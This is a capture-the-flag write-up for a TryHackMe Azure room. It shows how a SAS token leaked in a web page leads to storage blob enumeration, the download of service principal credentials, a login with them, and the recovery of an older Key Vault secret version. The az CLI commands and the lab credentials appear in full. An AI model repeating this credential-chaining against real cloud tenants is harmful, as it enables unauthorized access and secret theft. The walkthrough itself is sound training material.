<p align="center">
  <img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" width="150" alt="TryHackMe Logo">
</p>

# CryptoCabana

| Room Name | CryptoCabana |
|-----------|--------------|
| Platform | TryHackMe |
| Event | Hacker Holidays 2026 |
| Points | 90 |
| Category | ☁️ Cloud |
| Difficulty | Medium |
| Tags | Azure, Storage Accounts, Azure Key Vault, Cloud Misconfiguration, Information Disclosure |
| Status | ✅ Completed |

## Room Information

```text
Type: CTF Challenge
Difficulty: Medium
Category: Cloud / Azure

Description:
He never signed the transfer. The place he stashed his secret wasn't as sealed as promised.
```

## Challenge Overview

**Hacker Holidays: Day 9 — CryptoCabana**

The Byte Lotus Hotel provides guests with the CryptoCabana kiosk, allowing them to securely back up cryptocurrency seed phrases. The application claims that backups are safely stored, but the kiosk quietly trusts several Azure cloud resources that are exposed to anyone who knows where to look.

The objective is to enumerate the web application, discover publicly exposed Azure resources, identify how the application retrieves secrets, recover an older version of a secret from Azure Key Vault, and use it to obtain the flag.

## Objectives

- Pull apart what the kiosk hands out for free before you've even clicked anything.
- Follow that trust somewhere the kiosk's own page never once points you.
- Somewhere in there is a second, more valuable set of keys — and a vault that won't give up the real values on the first ask.

## Solution

- This challenge was a Azure-themed challenge involving insecure client-side configuration, Azure Storage, and Azure Key Vault version history. First thing I did was to look at the challenge description and it said `Pull apart what the kiosk hands out for free before you've even clicked anything` which makes me think there might be something hardcoded somewhere like credentials?
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/bb4a3a5a-9ca2-4ad0-9646-24c180a27a69" />
</p>

- I went to the website they gave me and opened the developer tools and found some hardcoded credentials here. Here, we found the Azure storage account name, container name and the SAS token
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/5bc1dd15-d424-470b-a1aa-14bfe859d719" />
</p>

- Here, TryHackMe was nice enough to give us access to the Azure CLI for solving this challenge
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/efa00dd5-3301-4326-88a6-28ae88100585" />
</p>

- Now, I noticed the SAS token had read and list permissions which meant we were able to explore the storage account such as reading blobs or listing everything in that container or account. I tried listing the `backups` container but nothing was found here
```
az storage blob list \
  --account-name "cryptocabanaf5scjagc" \
  --container-name "backups" \
  --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
  --query "[].{Name:name, Size:properties.contentLength}" \
  --output table
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/f34a6090-6e3d-40de-9724-24ed7ced6eaf" />
</p>

- Then I decided to list all containers instead of just listing the blobs inside `backups` and we can see an interesting container named `vault`
```
az storage container list \
  --account-name "cryptocabanaf5scjagc" \
  --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
  --output table
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/9681787c-4f06-4769-9189-cca34eb3419c" />
</p>

- I listed all the blobs inside this container `vault` and there are two blobs here as shown below
```
az storage blob list \
  --account-name "cryptocabanaf5scjagc" \
  --container-name "vault" \
  --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
  --output table
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/bc5a1193-7e7c-468a-bb55-6eb82192a7db" />
</p>

- I downloaded `backup-service-account.json` because I thought there might be some credentials in there
```
az storage blob download \
  --account-name "cryptocabanaf5scjagc" \
  --container-name "vault" \
  --name "backup-service-account.json" \
  --file "backup-service-account.json" \
  --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/84806b47-9bd5-40f4-b3ad-e12da98cba98" />
</p>

```
cat backup-service-account.json
```
- I then used `cat` to see the contents of this blob and BOOM!, we found ourselves some credentials. These are specifically service principal credentials (machine account). We got the Client ID, Client Secret, Tenant ID and Key Vault name
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/d27f221f-2456-4854-85e6-1d62b563401c" />
</p>
 
- Now, I can login as the service principal account
```
az login --service-principal \
  --username "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" \
  --password "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" \
  --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/d5c036e8-2920-46f1-b306-0c21274a0978" />
</p>

- I listed the secrets in this vault and we can see there are four of them. The challenge description did say `Somewhere in there is a second, more valuable set of keys` so I assumed that the `master-key` in this case is not important. Also, it seems that the flag is split up into three pieces
```
az keyvault secret list --vault-name "ccabana-kv-f5scjagc" --output table
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/f7f39278-ccf2-4811-8630-ab7671f7bb0d" />
</p>

- To confirm the theory of skipping the `master-key`, I tried reading it but it did not work as I don't believe we have permission to do so
```
az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "master-key" --query value --output tsv
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/45897552-56c2-4679-9f85-a682055e09f5" />
</p>

- I displayed all the secrets and it printed the first and last part of the flag but not the middle part. This message in the middle meant I had to look previous version of `key-shard-2`
```
az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "key-shard-1" --query value --output tsv
az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "key-shard-2" --query value --output tsv
az keyvault secret show --vault-name "ccabana-kv-f5scjagc" --name "key-shard-3" --query value --output tsv
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/1334784e-18a6-4d6e-96df-4dea257e6ccd" />
</p>

- I looked for the version history for `key-shard-2` and we can see there are two versions
```
az keyvault secret list-versions \
  --vault-name "ccabana-kv-f5scjagc" \
  --name "key-shard-2" \
  --query "[].{VersionID:id, Created:attributes.created}" \
  --output table
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/89ec8cc0-4026-4f00-96b2-bb2a6ca5a801" />
</p>

- I ran this command with the older version and printed the middle part of the flag as covered by the red box
```
az keyvault secret show \
  --vault-name "ccabana-kv-f5scjagc" \
  --name "key-shard-2" \
  --version "3d6492d2c6f74123bc754a9ded22b2a0" \
  --query value \
  --output tsv
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/69d470b2-bf81-4362-a096-a4dd02f4c75a" />
</p>

## Skills Learned

* Identifying sensitive information exposed in client-side JavaScript
* Enumerating Azure Storage Accounts using SAS tokens
* Understanding Azure SAS token permissions (Read/List)
* Enumerating Azure Blob Storage containers and blobs
* Extracting credentials from publicly accessible storage blobs
* Authenticating to Azure using a Service Principal
* Enumerating Azure Key Vault secrets
* Retrieving secret values from Azure Key Vault
* Enumerating Azure Key Vault secret version history
* Recovering previous versions of Azure Key Vault secrets
* Identifying cloud misconfigurations leading to information disclosure
* Performing Azure cloud enumeration with the Azure CLI

## Tools Used

* Browser Developer Tools
* Azure CLI (`az`)
* `cat`

## Flags

🚩 Flag: `THM{********************}`
